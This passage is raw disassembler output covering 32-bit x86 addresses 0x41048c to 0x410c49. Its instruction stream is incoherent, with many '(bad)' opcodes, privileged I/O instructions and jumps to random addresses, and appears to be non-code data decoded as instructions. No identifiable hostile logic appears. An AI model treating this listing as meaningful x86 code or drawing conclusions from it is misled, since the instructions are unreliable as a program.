  41048c:	aas    
  41048d:	es iret 
  41048f:	sbb    dl,bl
  410491:	push   0xffffffc4
  410493:	icebp  
  410494:	jno    0x410463
  410496:	and    BYTE PTR [ecx+0x2f970b40],cl
  41049c:	mov    dl,0x93
  41049e:	lds    eax,FWORD PTR [eax]
  4104a0:	and    BYTE PTR [edi+0x4c],ch
  4104a3:	jbe    0x4104be
  4104a5:	xchg   esi,eax
  4104a6:	xor    BYTE PTR [ebp+ecx*2-0x52],ch
  4104aa:	(bad)  
  4104ab:	inc    edi
  4104ac:	test   DWORD PTR [edx],ecx
  4104ae:	mov    al,ds:0x710db49b
  4104b3:	pop    ebx
  4104b4:	ss pop ss
  4104b6:	add    eax,0xd5923976
  4104bb:	sub    BYTE PTR ds:0x5b2d0b40,0x79
  4104c2:	mov    eax,ds:0xb4e71d29
  4104c7:	mov    cl,0xd1
  4104c9:	adc    eax,0x350f1d70
  4104ce:	jne    0x4104b3
  4104d0:	pop    ebx
  4104d1:	mov    esi,0xd856b1b4
  4104d6:	mov    edx,0x3650da27
  4104db:	add    BYTE PTR ds:0xaaba3e72,ah
  4104e1:	lods   eax,DWORD PTR ds:[esi]
  4104e2:	bound  ebp,QWORD PTR [ebp-0x6bafcd94]
  4104e8:	mov    dh,0xdd
  4104ea:	pop    edx
  4104eb:	pop    ss
  4104ec:	jl     0x410569
  4104ee:	in     al,dx
  4104ef:	scas   eax,DWORD PTR es:[edi]
  4104f0:	or     BYTE PTR [eax],bl
  4104f2:	mov    eax,0x2e7496f5
  4104f7:	sub    BYTE PTR ds:0x2e5d228a,0x83
  4104fe:	xor    BYTE PTR [eax],al
  410500:	fndisi(8087 only) 
  410502:	mov    al,ds:0x84729447
  410507:	rol    DWORD PTR [ecx+esi*2+0x63],1
  41050b:	pop    ebx
  41050c:	nop
  41050d:	mov    ds:0xc0845f08,al
  410512:	jbe    0x4104bf
  410514:	inc    ecx
  410515:	arpl   WORD PTR [esi+0x77bf0115],sp
  41051b:	sub    eax,0x5f136db4
  410520:	ins    BYTE PTR es:[edi],dx
  410521:	mov    esp,0x8ba179bf
  410526:	push   ebp
  410527:	inc    edx
  410528:	fstp   TBYTE PTR [eax-0x4f7c97d3]
  41052e:	call   FWORD PTR [edx+0x3c]
  410531:	xor    eax,0x160d2ef5
  410536:	mov    edx,0xb84f67e0
  41053b:	lods   al,BYTE PTR ds:[esi]
  41053c:	sub    edx,edi
  41053e:	or     eax,esp
  410540:	test   esi,eax
  410542:	lea    edx,[edi]
  410544:	sbb    ah,dh
  410546:	pop    ds
  410547:	pusha  
  410548:	pop    ds
  410549:	pop    ebp
  41054a:	adc    DWORD PTR [ecx],eax
  41054c:	loopne 0x410504
  41054e:	jne    0x41054b
  410550:	fcom   DWORD PTR [esi+edi*4]
  410553:	add    eax,0x4ac783fe
  410558:	adc    DWORD PTR [ebx-0x6f],ecx
  41055b:	ja     0x4105bf
  41055d:	xchg   esi,eax
  41055e:	ror    BYTE PTR [eax],1
  410560:	push   0x59c96117
  410565:	push   eax
  410566:	dec    edx
  410567:	lods   eax,DWORD PTR ds:[esi]
  410568:	ins    DWORD PTR es:[edi],dx
  410569:	cmp    BYTE PTR [eax+0x61ea1ee],0x89
  410570:	fdiv   QWORD PTR [eax+ecx*8-0x28]
  410574:	mov    dh,0x8d
  410576:	test   DWORD PTR [eax+0x31],esp
  410579:	sub    eax,0xfd17332a
  41057e:	mov    dh,0x5d
  410580:	push   0x57
  410582:	pop    esp
  410583:	pop    eax
  410584:	mov    eax,0xb37482d3
  410589:	imul   ecx,edi,0xc6b76b0b
  41058f:	mov    bh,BYTE PTR cs:[ecx-0x28]
  410593:	add    edi,eax
  410595:	dec    esi
  410596:	loopne 0x4105c7
  410598:	ja     0x41054b
  41059a:	je     0x410527
  41059c:	ins    DWORD PTR es:[edi],dx
  41059d:	dec    esp
  41059e:	mov    WORD PTR ds:0xcb468af6,ss
  4105a4:	cld    
  4105a5:	pop    edx
  4105a6:	stos   DWORD PTR es:[edi],eax
  4105a7:	aam    0x14
  4105a9:	arpl   WORD PTR [ebp-0x7a8bf174],ax
  4105af:	test   DWORD PTR [ebp-0x51923723],ebp
  4105b5:	ja     0x410579
  4105b7:	std    
  4105b8:	scas   eax,DWORD PTR es:[edi]
  4105b9:	or     DWORD PTR [edx+ebx*8],esi
  4105bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105be:	lods   eax,DWORD PTR ds:[esi]
  4105bf:	xchg   edx,eax
  4105c0:	scas   eax,DWORD PTR es:[edi]
  4105c1:	mov    al,ds:0xb23522c5
  4105c6:	(bad)  
  4105c7:	into   
  4105c8:	lea    ebp,[ebp+0x6b]
  4105cb:	fld    TBYTE PTR [esi*4-0x4e8c660e]
  4105d2:	mov    al,0x20
  4105d4:	aad    0x6d
  4105d6:	inc    eax
  4105d7:	test   eax,0xa49b5fb6
  4105dc:	(bad)  
  4105dd:	and    al,0xc6
  4105df:	mov    dh,0x8d
  4105e1:	lods   eax,DWORD PTR ds:[esi]
  4105e2:	mov    al,0xcb
  4105e4:	int3   
  4105e5:	sbb    esp,ebp
  4105e7:	jbe    0x410652
  4105e9:	adc    bh,BYTE PTR [ebp-0x9]
  4105ec:	aaa    
  4105ed:	mov    dh,0xb6
  4105ef:	ffree  st(2)
  4105f1:	cs es pop esp
  4105f4:	push   cs
  4105f5:	dec    ebp
  4105f6:	clc    
  4105f7:	cmp    BYTE PTR [esi],bl
  4105f9:	ret    0x5dda
  4105fc:	ficom  DWORD PTR [esi-0x4c1f78e6]
  410602:	xor    eax,0x4877801f
  410607:	mov    bh,0x85
  410609:	ins    DWORD PTR es:[edi],dx
  41060a:	mov    eax,ds:0x597eb547
  41060f:	in     al,dx
  410610:	test   eax,0x23e5fee6
  410615:	sbb    ebx,DWORD PTR [ebx]
  410617:	pop    ebp
  410618:	add    bh,bl
  41061a:	jne    0x41067f
  41061c:	or     BYTE PTR [ebx+ebx*4],ah
  41061f:	sar    BYTE PTR [eax-0x18c4924f],1
  410625:	stos   BYTE PTR es:[edi],al
  410626:	dec    esi
  410627:	mov    ebp,0x5bf92e42
  41062c:	pop    ebx
  41062d:	pop    ebx
  41062e:	mov    eax,0x7fbf9edf
  410633:	add    DWORD PTR [esi+0x41],ebp
  410636:	adc    eax,0x42ad279a
  41063b:	mov    ah,0x5b
  41063d:	push   ss
  41063e:	sbb    esi,DWORD PTR [ecx+0x4c]
  410641:	sub    eax,0x3636ddca
  410646:	mov    dh,0x83
  410648:	stos   BYTE PTR es:[edi],al
  410649:	fs inc ebp
  41064b:	popf   
  41064c:	js     0x41063e
  41064e:	in     al,dx
  41064f:	and    DWORD PTR [edi-0x4aacf57b],ebx
  410655:	repnz inc esi
  410657:	and    al,0x54
  410659:	fld    TBYTE PTR [ebp+0x6b]
  41065c:	fist   DWORD PTR [ebp+0x7a13f5ff]
  410662:	xlat   BYTE PTR ds:[ebx]
  410663:	xchg   edi,eax
  410664:	xchg   ebp,eax
  410665:	mov    eax,0xd59923f4
  41066a:	inc    esi
  41066b:	pop    es
  41066c:	ins    DWORD PTR es:[edi],dx
  41066d:	mov    edi,0xe15dac30
  410672:	retf   0xd1ba
  410675:	inc    eax
  410676:	dec    ebx
  410677:	dec    esi
  410678:	ret    0x39a7
  41067b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41067c:	push   ecx
  41067d:	mov    bh,0x2a
  41067f:	retf   0xa942
  410682:	inc    ebp
  410683:	scas   eax,DWORD PTR es:[edi]
  410684:	pop    eax
  410685:	pop    ebx
  410686:	jmp    0x9b0ad741
  41068b:	sbb    eax,0x98544008
  410690:	sbb    DWORD PTR [edx],0x7f
  410693:	mov    eax,ds:0x777aaa6d
  410698:	fdiv   QWORD PTR [esi+0x44]
  41069b:	in     eax,0x8d
  41069d:	add    DWORD PTR [eax],0xffffff8c
  4106a0:	push   ebx
  4106a1:	add    BYTE PTR [ecx-0x1635c8f6],ah
  4106a7:	jle    0x4106d9
  4106a9:	sub    cl,cl
  4106ab:	test   eax,0xfcb404a9
  4106b0:	inc    edx
  4106b1:	inc    eax
  4106b2:	fiadd  DWORD PTR [esi+0x0]
  4106b5:	popa   
  4106b6:	in     eax,0xe8
  4106b8:	ins    BYTE PTR es:[edi],dx
  4106b9:	(bad)  [esi-0x30b5572f]
  4106bf:	mov    ds:0x4b713e11,eax
  4106c4:	pop    edi
  4106c5:	or     DWORD PTR [eax],0xf66db1ba
  4106cb:	(bad)  
  4106cd:	jo     0x41070b
  4106cf:	lahf   
  4106d0:	(bad)  
  4106d1:	fistp  DWORD PTR [eax+0x58]
  4106d4:	call   0x86a2dcd9
  4106d9:	sub    dl,dh
  4106db:	leave  
  4106dc:	shl    ebx,cl
  4106de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106df:	push   0xffffff89
  4106e1:	pusha  
  4106e2:	jnp    0x410674
  4106e4:	div    al
  4106e6:	xchg   edi,eax
  4106e7:	mov    dh,0x25
  4106e9:	(bad)  
  4106eb:	(bad)  
  4106ec:	and    BYTE PTR [edx-0x6f],ch
  4106ef:	lds    esi,FWORD PTR [ebx]
  4106f1:	retf   
  4106f2:	mov    dh,0xf3
  4106f4:	pop    ebp
  4106f5:	sub    BYTE PTR [edx+ebp*2-0x53],bl
  4106f9:	into   
  4106fa:	hlt    
  4106fb:	mov    dh,0xfa
  4106fd:	icebp  
  4106fe:	fcmovnb st,st(0)
  410700:	push   0x74a16361
  410705:	mov    al,ds:0xbb720f2b
  41070a:	xchg   esp,eax
  41070b:	sub    BYTE PTR [eax],dl
  41070d:	pop    ebx
  41070e:	test   edx,ecx
  410710:	shl    BYTE PTR [eax+0x55b81673],1
  410716:	add    ah,al
  410718:	jbe    0x4106b3
  41071a:	daa    
  41071b:	stc    
  41071c:	mov    ebp,DWORD PTR [edx]
  41071e:	mov    eax,0x1826da50
  410723:	(bad)  
  410724:	rcr    ch,1
  410726:	push   edx
  410727:	fisubr DWORD PTR [ebp+0x63]
  41072a:	jmp    0x4106b4
  41072c:	out    0x80,al
  41072e:	jo     0x41078a
  410730:	and    cl,BYTE PTR [edx+esi*1-0x2e4fbb28]
  410737:	push   ebp
  410738:	fdiv   QWORD PTR ds:0xa7b14f4f
  41073e:	out    0x13,eax
  410740:	test   DWORD PTR [ebp-0x2b6e4ebb],ebp
  410746:	jae    0x4106e3
  410748:	or     edx,esp
  41074a:	rcl    BYTE PTR [edx+0x17],cl
  41074d:	rcr    BYTE PTR [ebx+ecx*2+0x7d],1
  410751:	sbb    eax,edi
  410753:	mov    esi,0x83a36d47
  410758:	call   0xd8df17d7
  41075d:	imul   ecx,DWORD PTR [ecx+0x53],0x85a5b714
  410764:	cmp    ecx,DWORD PTR [edx]
  410766:	js     0x410715
  410768:	and    bl,ah
  41076a:	icebp  
  41076b:	in     al,dx
  41076c:	push   ebp
  41076d:	fcmovnb st,st(2)
  41076f:	(bad)  
  410770:	(bad)  
  410771:	adc    dh,BYTE PTR [edi+0xa]
  410774:	jae    0x4107d3
  410776:	(bad)  
  410777:	push   eax
  410778:	pop    ebx
  410779:	and    BYTE PTR [edx+0x28],bl
  41077c:	xor    ebp,DWORD PTR [ebx]
  41077e:	add    DWORD PTR [esi-0x549e8524],ebp
  410784:	lock imul edx,eax,0x285bc5bc
  41078b:	std    
  41078c:	push   ds
  41078d:	test   edx,0xf66b70ad
  410793:	inc    eax
  410794:	push   ecx
  410795:	cmc    
  410796:	xlat   BYTE PTR fs:[ebx]
  410798:	mov    ebx,0x2584f5c
  41079d:	fcomp  st(2)
  41079f:	lods   eax,DWORD PTR ds:[esi]
  4107a0:	xchg   dh,cl
  4107a2:	mov    esi,DWORD PTR [esi+0x6d2b766e]
  4107a8:	add    BYTE PTR [ebp-0x64],ch
  4107ab:	or     al,0xaa
  4107ad:	add    ch,BYTE PTR [esi+0x7]
  4107b0:	inc    edi
  4107b1:	sbb    esp,DWORD PTR [ebp+0x65b3a502]
  4107b7:	inc    esp
  4107b8:	cmp    DWORD PTR [ebx-0x5d4497a4],edx
  4107be:	fsub   QWORD PTR ds:0x34e9bd2c
  4107c4:	sbb    BYTE PTR [ecx+0x7ed85942],0xe1
  4107cb:	mov    BYTE PTR [edi+ebp*8],bl
  4107ce:	aas    
  4107cf:	jg     0x410839
  4107d1:	add    DWORD PTR [ebx],ebx
  4107d3:	add    BYTE PTR [esi-0x49152613],dh
  4107d9:	push   esp
  4107da:	xchg   BYTE PTR [ebx+eax*2-0x54],ch
  4107de:	inc    ecx
  4107df:	mov    al,0x2d
  4107e1:	xor    eax,0x2969bf11
  4107e6:	cld    
  4107e7:	cmp    DWORD PTR [esi-0x4f492494],eax
  4107ed:	icebp  
  4107ee:	sbb    al,0x3d
  4107f0:	(bad)  
  4107f1:	pop    ecx
  4107f2:	mov    cl,0x80
  4107f4:	ja     0x410852
  4107f6:	cs in  eax,dx
  4107f8:	inc    edx
  4107f9:	mov    ebx,0x17d5402d
  4107fe:	mov    ds:0x1f46e98d,al
  410803:	mov    bl,BYTE PTR [edi-0x2a]
  410806:	outs   dx,BYTE PTR ds:[esi]
  410807:	ins    DWORD PTR es:[edi],dx
  410808:	test   edi,ebx
  41080a:	cs (bad) 
  41080c:	lock mov ds:0xead7838,eax
  410812:	ins    DWORD PTR es:[edi],dx
  410813:	mov    ecx,0xe056d0b5
  410818:	les    edx,FWORD PTR [esi]
  41081a:	jb     0x410832
  41081c:	inc    edi
  41081d:	push   esi
  41081e:	mov    ebp,DWORD PTR [eax-0x65]
  410821:	or     BYTE PTR [esi+esi*1+0x6d8f42c8],0x8a
  410829:	outs   dx,BYTE PTR ds:[esi]
  41082a:	lea    ebx,[ebx-0x56]
  41082d:	and    ecx,DWORD PTR [edi]
  41082f:	daa    
  410830:	out    dx,eax
  410831:	mov    ch,0x46
  410834:	inc    edi
  410835:	mov    ch,0x6d
  410837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410838:	nop
  410839:	adc    DWORD PTR [esp+ecx*1+0x1c],ebx
  41083d:	shl    DWORD PTR [edi],cl
  41083f:	rol    dh,0xb6
  410842:	rcr    BYTE PTR [ebp+0x33e3c7b6],1
  410848:	aad    0x43
  41084a:	ins    DWORD PTR es:[edi],dx
  41084b:	mov    ds:0xfaa34b6d,eax
  410850:	lods   eax,DWORD PTR ds:[esi]
  410851:	je     0x4107d3
  410853:	lea    eax,[esp+edx*8-0x25c92250]
  41085a:	and    BYTE PTR [ebx+0x11],dh
  41085d:	dec    esi
  41085e:	jl     0x4108bf
  410860:	mov    bh,0x33
  410862:	push   eax
  410863:	xchg   edi,eax
  410864:	pop    ebx
  410865:	in     eax,dx
  410866:	inc    edx
  410867:	inc    ebx
  410868:	retf   
  410869:	xchg   ebp,eax
  41086a:	jg     0x410889
  41086c:	fcmovnbe st,st(7)
  41086e:	imul   ebp
  410870:	mov    ebx,0x580bb6d0
  410875:	lods   eax,DWORD PTR ds:[esi]
  410876:	push   es
  410877:	mov    WORD PTR [ecx+edx*1+0x77280e58],ds
  41087e:	ins    BYTE PTR es:[edi],dx
  41087f:	sbb    edx,esp
  410881:	push   edx
  410882:	out    dx,eax
  410883:	xor    al,0xaa
  410885:	mov    cl,0xfb
  410887:	sub    dh,BYTE PTR [esi-0x1e92ee30]
  41088d:	and    DWORD PTR [edi],esp
  41088f:	push   es
  410890:	and    eax,0x2ed8ec2b
  410895:	mov    ah,0xdb
  410897:	mov    ch,0xe0
  410899:	sti    
  41089a:	sar    BYTE PTR [ebx],cl
  41089c:	cmp    eax,0x20717654
  4108a1:	mov    ch,0xed
  4108a3:	mov    dh,0x51
  4108a5:	jns    0x410879
  4108a7:	sbb    BYTE PTR [ecx+0x7f],0x24
  4108ab:	cmp    BYTE PTR [edx+0x8],0x8a
  4108af:	fcmovnbe st,st(6)
  4108b1:	mov    eax,0x4eb24ebf
  4108b6:	out    dx,eax
  4108b7:	xchg   esi,eax
  4108b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108b9:	lar    edx,si
  4108bc:	xchg   esi,eax
  4108bd:	and    BYTE PTR [esi+0x1c70f834],0x80
  4108c4:	xchg   ebx,eax
  4108c5:	push   ss
  4108c6:	fiadd  DWORD PTR [edx]
  4108c8:	ror    BYTE PTR ds:0xa3e0fe0a,0xac
  4108cf:	ins    DWORD PTR es:[edi],dx
  4108d0:	mov    edx,DWORD PTR [esi]
  4108d2:	ss xchg ebx,eax
  4108d4:	fwait
  4108d5:	cmp    cl,bh
  4108d7:	cwde   
  4108d8:	jmp    0x4108c6
  4108da:	sub    edx,DWORD PTR [esi+0x61264b6e]
  4108e0:	into   
  4108e1:	scas   eax,DWORD PTR es:[edi]
  4108e2:	scas   eax,DWORD PTR es:[edi]
  4108e3:	out    dx,eax
  4108e4:	mov    eax,0xb70a26a2
  4108e9:	mov    dh,0xd5
  4108eb:	mov    eax,ds:0xa7e06b17
  4108f0:	dec    esp
  4108f1:	fnstenv [eax-0x23aa4fd3]
  4108f7:	sub    esi,esi
  4108f9:	mov    al,0xc8
  4108fb:	dec    eax
  4108fc:	or     ecx,DWORD PTR [ebx]
  4108fe:	dec    ebx
  4108ff:	sbb    eax,0x16624d15
  410904:	jl     0x41093f
  410906:	int    0x2a
  410908:	outs   dx,BYTE PTR ds:[esi]
  410909:	pop    ebx
  41090a:	or     ecx,DWORD PTR [ebp+0x76079688]
  410910:	cmp    bh,BYTE PTR [esi-0x27517e29]
  410916:	adc    BYTE PTR [ebp-0x7e],ch
  410919:	pop    edx
  41091a:	clc    
  41091b:	cmp    BYTE PTR [eax+edi*1+0x13],ah
  41091f:	fadd   DWORD PTR [ecx+0x6d]
  410922:	stos   BYTE PTR es:[edi],al
  410923:	sub    BYTE PTR [ebx],bh
  410925:	loope  0x410947
  410927:	jge    0x4108f3
  410929:	mov    dh,0x8d
  41092b:	lods   eax,DWORD PTR ds:[esi]
  41092c:	sub    DWORD PTR [ecx],ecx
  41092e:	jne    0x41091c
  410930:	test   edi,ecx
  410932:	je     0x41097b
  410934:	xchg   esp,eax
  410935:	rol    DWORD PTR [esi],1
  410937:	sub    BYTE PTR [ebx+eiz*4],dl
  41093a:	lds    ebp,FWORD PTR [edi-0x44925ea8]
  410940:	ins    DWORD PTR es:[edi],dx
  410941:	dec    ebp
  410942:	mov    edi,0x2e43256
  410947:	push   ss
  410948:	jmp    0x1b6:0xc447cf6e
  41094f:	ins    BYTE PTR es:[edi],dx
  410950:	sti    
  410951:	aam    0x59
  410953:	into   
  410954:	sub    al,0xac
  410956:	mov    ebx,0x5136d52d
  41095b:	push   edi
  41095c:	in     eax,dx
  41095d:	enter  0x63ab,0x98
  410961:	fs lahf 
  410963:	sub    al,0x5b
  410965:	loope  0x41097d
  410967:	pop    ebx
  410968:	out    0x58,al
  41096a:	xchg   ebx,eax
  41096b:	rol    BYTE PTR [ecx-0x4590c24e],cl
  410971:	stos   BYTE PTR es:[edi],al
  410972:	or     ebx,DWORD PTR [ebx]
  410974:	dec    eax
  410975:	dec    eax
  410976:	inc    ebx
  410977:	icebp  
  410978:	xchg   ecx,eax
  410979:	fucomp st(2)
  41097b:	fild   QWORD PTR [esi]
  41097d:	outs   dx,DWORD PTR ds:[esi]
  41097e:	aaa    
  41097f:	outs   dx,DWORD PTR ds:[esi]
  410980:	mov    BYTE PTR [ecx-0x35],0xa8
  410984:	add    al,ah
  410986:	je     0x410940
  410988:	enter  0x66,0x25
  41098c:	loopne 0x410942
  41098e:	pop    edi
  41098f:	pop    esp
  410990:	sub    dl,BYTE PTR [edx+edx*4]
  410993:	jnp    0x410946
  410995:	mov    ?,WORD PTR [ecx+ebp*1]
  410998:	popa   
  410999:	imul   esp,DWORD PTR [edx],0x6e
  41099c:	ins    BYTE PTR es:[edi],dx
  41099d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41099e:	call   0x159d8202
  4109a3:	out    dx,al
  4109a4:	xor    eax,0x996176a8
  4109a9:	sub    ebp,DWORD PTR [eax-0x3e521fbb]
  4109af:	push   esi
  4109b0:	sub    BYTE PTR [edx+eax*8],ch
  4109b3:	ret    0x8707
  4109b6:	and    BYTE PTR [eax],cl
  4109b8:	sbb    al,BYTE PTR [eax]
  4109ba:	dec    ebx
  4109bb:	or     eax,0x21051fd7
  4109c0:	mov    ah,0xd8
  4109c2:	sub    ch,bl
  4109c4:	fmul   DWORD PTR [edi]
  4109c6:	ret    
  4109c7:	add    ebx,ecx
  4109c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109ca:	mov    al,0x51
  4109cc:	nop
  4109cd:	sbb    esi,DWORD PTR [edi+0x2645b6d]
  4109d3:	xor    ch,BYTE PTR [ecx+ebp*8-0x413f9101]
  4109da:	ins    BYTE PTR es:[edi],dx
  4109db:	sahf   
  4109dc:	sar    BYTE PTR [esi-0x24],1
  4109df:	push   0x12efd538
  4109e4:	leave  
  4109e5:	test   BYTE PTR [esi-0x2f],ch
  4109e8:	ins    BYTE PTR es:[edi],dx
  4109e9:	ins    DWORD PTR es:[edi],dx
  4109ea:	jecxz  0x4109a2
  4109ec:	call   0xc9ab:0x1be64754
  4109f3:	mov    esp,0x6f9746d7
  4109f8:	xor    eax,0x6782612e
  4109fd:	push   es
  4109fe:	popa   
  4109ff:	sbb    al,0x46
  410a01:	add    BYTE PTR [ecx-0x71],ch
  410a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a05:	fidiv  DWORD PTR [esi+0x6b]
  410a08:	ins    DWORD PTR es:[edi],dx
  410a09:	sub    DWORD PTR [esi],ebx
  410a0b:	fist   WORD PTR [edx-0x2bc12025]
  410a11:	add    eax,0x36d6edb
  410a16:	stc    
  410a17:	jo     0x4109f3
  410a19:	mov    esi,edi
  410a1b:	mov    bh,0xbc
  410a1d:	push   ebx
  410a1e:	pop    ecx
  410a1f:	fcmovnbe st,st(6)
  410a21:	outs   dx,BYTE PTR ds:[esi]
  410a22:	gs retf 0x74ce
  410a26:	sbb    ch,bl
  410a28:	fidiv  DWORD PTR [esi-0x4e4ad44d]
  410a2e:	mov    eax,ds:0xc7029b6e
  410a33:	pop    esi
  410a34:	jno    0x4109b6
  410a36:	mov    ds:0xddadb73d,al
  410a3b:	mov    al,ds:0xa5e3dbee
  410a40:	dec    edx
  410a41:	jmp    0x722d9a2a
  410a46:	ins    DWORD PTR es:[edi],dx
  410a47:	xchg   esp,eax
  410a48:	ds ins DWORD PTR es:[edi],dx
  410a4a:	ret    0x5340
  410a4d:	cmp    DWORD PTR [edx],esi
  410a4f:	cmc    
  410a50:	add    edx,DWORD PTR [edi+0x5b]
  410a53:	or     ebp,DWORD PTR [ebp-0x45]
  410a56:	sar    DWORD PTR [ebp-0x70393aac],1
  410a5c:	and    BYTE PTR [esi-0x6c],0x14
  410a60:	outs   dx,BYTE PTR ds:[esi]
  410a61:	or     eax,DWORD PTR [ebp-0x6d51af73]
  410a67:	jg     0x410aac
  410a69:	inc    edi
  410a6a:	and    BYTE PTR ds:0xba006b05,ch
  410a70:	adc    eax,0x5c244d4c
  410a75:	fwait
  410a76:	pop    eax
  410a77:	jp     0x410a3f
  410a79:	(bad)  
  410a7a:	add    DWORD PTR [esp+ebx*8+0x38],esi
  410a7e:	add    al,0x20
  410a80:	mov    dh,0x62
  410a82:	push   es
  410a83:	xor    eax,0x4cc305d4
  410a88:	pop    es
  410a89:	and    bl,dh
  410a8b:	mov    ch,0xac
  410a8d:	push   edx
  410a8e:	mov    dh,0x2b
  410a90:	pusha  
  410a91:	mov    ebx,0x833767da
  410a96:	jo     0x410a46
  410a98:	dec    eax
  410a99:	and    dl,BYTE PTR [esi-0x25]
  410a9c:	push   ecx
  410a9d:	pop    ss
  410a9e:	fidivr DWORD PTR [ebx+0x6b72e02]
  410aa4:	loope  0x410acd
  410aa6:	popa   
  410aa7:	dec    ebp
  410aa8:	add    eax,0x68505a16
  410aad:	jo     0x410ac0
  410aaf:	lea    esi,[edi-0x7197fe53]
  410ab5:	or     al,0x3e
  410ab7:	enter  0x2b2,0x9a
  410abb:	pop    esi
  410abc:	or     ebx,DWORD PTR [ebx]
  410abe:	retf   
  410abf:	sbb    esi,DWORD PTR [edi-0x2f11ff26]
  410ac5:	out    0x3d,eax
  410ac7:	mov    dl,0x2e
  410ac9:	sbb    ecx,DWORD PTR [ebx-0x7b]
  410acc:	or     ebp,DWORD PTR [eax]
  410ace:	int    0x5a
  410ad0:	(bad)  
  410ad1:	ds xchg ebx,eax
  410ad3:	imul   edx,DWORD PTR [esi+0x16],0x5c6db0b4
  410ada:	dec    eax
  410adb:	stos   BYTE PTR es:[edi],al
  410adc:	adc    esp,DWORD PTR [esp+edx*2-0x3b]
  410ae0:	test   al,0x5b
  410ae2:	pop    ss
  410ae3:	lds    ebx,FWORD PTR [ebp+0x2b]
  410ae6:	repz pop esp
  410ae9:	and    BYTE PTR [edi],dl
  410aeb:	ss push ss
  410aed:	call   0x8a18:0x99d5f0d
  410af4:	jl     0x410ac4
  410af6:	mov    ah,0x3c
  410af8:	mov    edx,0x9300e56d
  410afd:	add    al,0xcb
  410aff:	in     eax,0x95
  410b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b02:	ins    DWORD PTR es:[edi],dx
  410b03:	fs call 0x6d8e79b3
  410b09:	cmc    
  410b0a:	(bad)
  410b0e:	fst    QWORD PTR [esi+0x29]
  410b11:	fcomp  st(0)
  410b13:	cmp    DWORD PTR [edx+0x4f4e46c6],edi
  410b19:	mov    dh,0xb5
  410b1b:	in     eax,dx
  410b1c:	mov    BYTE PTR [ecx],0x72
  410b1f:	xchg   edx,eax
  410b20:	xlat   BYTE PTR ds:[ebx]
  410b21:	jno    0x410b04
  410b23:	jmp    0xb7b82dcf
  410b28:	lods   eax,DWORD PTR ds:[esi]
  410b29:	add    esp,edx
  410b2b:	mov    esp,0x3e8102ec
  410b30:	(bad)  
  410b31:	fnsave [edx+0x4dad6c31]
  410b37:	add    eax,0x1095c368
  410b3c:	inc    esp
  410b3d:	test   BYTE PTR [ebp+0x44b4b1b],dh
  410b43:	mov    DWORD PTR [edi-0x72e66ea],edi
  410b49:	loopne 0x410ba6
  410b4b:	or     ebx,DWORD PTR [ebx]
  410b4d:	mov    ah,0x2f
  410b4f:	mov    ecx,0x16a664a3
  410b54:	jg     0x410b4b
  410b56:	mov    eax,0xe50b2d
  410b5b:	sub    dh,BYTE PTR [ebp+0x5c599c8e]
  410b61:	repz sbb eax,0x22edb6d0
  410b67:	or     BYTE PTR [ecx+edx*2+0x5a739c5],dh
  410b6e:	ss mov dh,0x2d
  410b71:	jb     0x410afb
  410b73:	adc    al,0x20
  410b75:	loopne 0x410b7a
  410b77:	js     0x410b75
  410b79:	(bad)  [esi-0x443d25a3]
  410b7f:	or     BYTE PTR [edi],al
  410b81:	fdiv   DWORD PTR [eax+eax*2-0xb]
  410b85:	push   esp
  410b86:	push   esi
  410b87:	fnstenv [esi]
  410b89:	mov    ds:0xf25f6c6d,al
  410b8e:	shl    bl,0x44
  410b91:	clc    
  410b92:	jns    0x410c04
  410b94:	pop    ebx
  410b95:	fcomp  DWORD PTR [esi]
  410b97:	inc    eax
  410b98:	dec    esi
  410b99:	sub    al,0xef
  410b9b:	out    dx,al
  410b9c:	iret   
  410b9d:	xor    eax,0x5b54e6a6
  410ba2:	fist   DWORD PTR [eax+0x55]
  410ba5:	fisub  WORD PTR [ebx+0x1b07d4a1]
  410bab:	ins    DWORD PTR es:[edi],dx
  410bac:	adc    ebp,DWORD PTR [eax*1+0x2c54c2ec]
  410bb3:	mov    esp,0xb63604b1
  410bb8:	or     ebx,DWORD PTR [ebx]
  410bba:	sub    BYTE PTR ss:[esi-0x43],al
  410bbe:	and    eax,0x109ff144
  410bc3:	mov    ch,0x66
  410bc5:	or     bl,al
  410bc7:	(bad)  
  410bc8:	in     eax,0xf1
  410bca:	sbb    al,0x14
  410bcc:	mov    eax,ds:0x226d142d
  410bd1:	mov    eax,ss:0x62cda48e
  410bd7:	imul   esi,DWORD PTR [edi+0x3d35b56d],0xffffff80
  410bde:	shr    BYTE PTR ds:0xc4ed7ae3,0x42
  410be5:	arpl   WORD PTR [ebx+0x5bb1230f],ax
  410beb:	adc    esi,DWORD PTR [ebx]
  410bed:	adc    eax,0xe7027d6e
  410bf2:	sub    BYTE PTR [ebx],ch
  410bf4:	push   edi
  410bf5:	mov    ss,WORD PTR [esi+0x41]
  410bf8:	ins    DWORD PTR es:[edi],dx
  410bf9:	pop    ebp
  410bfa:	jno    0x410c5f
  410bfc:	adc    DWORD PTR [eax+esi*8+0x9],0xaf0821b7
  410c04:	sub    eax,0xc8b80b85
  410c09:	aam    0xe3
  410c0b:	jmp    FWORD PTR [esi]
  410c0d:	iret   
  410c0e:	mov    dh,0xa1
  410c10:	cs sub al,0x5f
  410c13:	mov    al,ds:0x1176dc1
  410c18:	lods   eax,DWORD PTR ds:[esi]
  410c19:	lea    eax,[ebx-0x3fcbfb4a]
  410c1f:	aaa    
  410c20:	popf   
  410c21:	stos   DWORD PTR es:[edi],eax
  410c22:	test   eax,0x51d53582
  410c27:	rol    DWORD PTR [ebp-0x36fb794e],1
  410c2d:	xor    ebp,DWORD PTR [esi-0x25]
  410c30:	mov    dh,0xb5
  410c32:	(bad)  
  410c33:	or     al,0xbb
  410c35:	fucom  st(3)
  410c37:	pop    esp
  410c38:	and    BYTE PTR [ebx+0x2],bh
  410c3b:	sub    ebx,DWORD PTR [ebx-0x249eafb6]
  410c41:	mov    eax,ds:0x2e52353d
  410c46:	sbb    BYTE PTR [edx-0x45],dl
  410c49:	xchg   ebp,eax
